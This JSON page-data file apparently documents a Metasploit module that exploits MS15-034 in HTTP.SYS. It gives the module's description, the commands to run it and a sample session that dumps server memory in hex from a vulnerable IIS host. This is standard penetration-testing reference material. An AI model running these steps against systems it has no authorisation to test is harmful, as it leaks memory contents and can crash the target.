{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/http/ms15_034_http_sys_memory_dump","result":{"data":{"moduleMetadataJson":{"id":"90cf1c5d-17e6-5d45-8dfb-da049c565d1b","name":"MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure","fullname":"auxiliary/scanner/http/ms15_034_http_sys_memory_dump","description":"This module dumps memory contents using a crafted Range header and affects only\n        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target\n        is running in VMware Workstation, this module has a high likelihood\n        of resulting in BSOD; however, VMware ESX and non-virtualized hosts\n        seem stable. Using a larger target file should result in more memory\n        being dumped, and SSL seems to produce more data as well.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/http/ms15_034_http_sys_memory_dump","documentationSlug":"/modules/documentation/auxiliary/scanner/http/ms15_034_http_sys_memory_dump","referencesSlug":"/modules/references/auxiliary/scanner/http/ms15_034_http_sys_memory_dump"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module dumps memory contents using a crafted Range header and affects only Windows 8.1, Server 2012, and Server 2012R2. </p>\n<p><strong>Note:</strong> If the target is running in VMware Workstation, this module has a high likelihood of resulting in BSOD; however, VMware ESX and non-virtualized hosts seem stable. Using a larger target file should result in more memory being dumped, and SSL seems to produce more data as well.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/http/ms15_034_http_sys_memory_dump</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li>Do: <code class=\"language-text\">set RPORT [PORT]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/http/ms15_034_http_sys_memory_dump\nmsf auxiliary(ms15_034_http_sys_memory_dump) &gt; set RHOSTS 10.1.1.125\nRHOSTS =&gt; 10.1.1.125\nmsf auxiliary(ms15_034_http_sys_memory_dump) &gt; set RPORT 80\nRPORT =&gt; 80\nmsf auxiliary(ms15_034_http_sys_memory_dump) &gt; exploit\n\n[+] Target is vulnerable!\n[+] Content length is 10240 bytes\n[+] Stand by...\n[+] Memory contents:\n[*] 4854 5450 2f31 2e31 2032 3030 204f 4b0d    HTTP/1.1 200 OK.\n[*] 0a43 6f6e 7465 6e74 2d54 7970 653a 2074    .Content-Type: t\n[*] 6578 742f 6874 6d6c 0d0a 4c61 7374 2d4d    ext/html..Last-M\n[*] 6f64 6966 6965 643a 204d 6f6e 2c20 3232    odified: Mon, 20\n[*] 204a 756e 2032 3031 3520 3134 3a32 313a     Mar 2017 21:27:\n[*] 3535 2047 4d54 0d0a 4163 6365 7074 2d52    55 GMT..Accept-R\n[*] 616e 6765 733a 2062 7974 6573 0d0a 4554    anges: bytes..ET\n[*] 6167 3a20 2261 3563 6663 3863 6166 3661    ag: &quot;a5cfc8caf6a\n[*] 6364 3031 3a30 220d 0a53 6572 7665 723a    cd01:0&quot;..Server:\n[*] 204d 6963 726f 736f 6674 2d49 4953 2f38     Microsoft-IIS/8\n[*] 2e35 0d0a 582d 506f 7765 7265 642d 4279    .5..X-Powered-By\n[*] 3a20 4153 502e 4e45 540d 0a00 0000 0000    : ASP.NET.......\n[*] 0000 0202 4672 6167 0000 0000 0000 0000    ....Frag........\n[*] c028 0000 0000 0000 0000 0000 0000 0000    .(..............\n[*] 0200 0a00 4672 6565 0000 0000 0000 0000    ....Free........\n[*] d01e f6c5 02f8 ffff 40a2 6502 00e0 ffff    ........@.e.....\n[*] 0a00 0d02 4d64 6c20 0000 0000 0000 0000    ....Mdl ........\n[*] 1000 6702 00e0 ffff 3800 0c00 0000 0000    ..g.....8.......\n[*] 0000 0000 0000 0000 ba9a e501 00e0 ffff    ................\n[*] 0090 e501 00e0 ffff 5c00 0000 ba0a 0000    ........\\.......\n[*] 59a8 1300 0000 0000 0000 0000 0000 0000    Y...............\n[*] 0000 0000 0000 0000 0000 0000 0000 e0dc    ................\n[*] 0d00 0d02 4d64 6c20 0000 0000 0000 0000    ....Mdl ........\n[*] 9079 2602 00e0 ffff 3800 1c00 0000 0000    .y&amp;.....8.......\n...\n...\n...\n[*] 6079 0702 00e0 ffff 0000 0000 0000 0000    `y..............\n[*] 0e00 1902 5669 4d6d 0000 0000 0000 0000    ....ViMm........\n[*] Suppressed 346 uninteresting lines\n[*] Memory dump saved to /home/rw/.msf4/loot/20150622073911_default_10.1.1.125_iis.ms15034_145400.bin\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ms15_034_http_sys_memory_dump) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"90cf1c5d-17e6-5d45-8dfb-da049c565d1b"}}}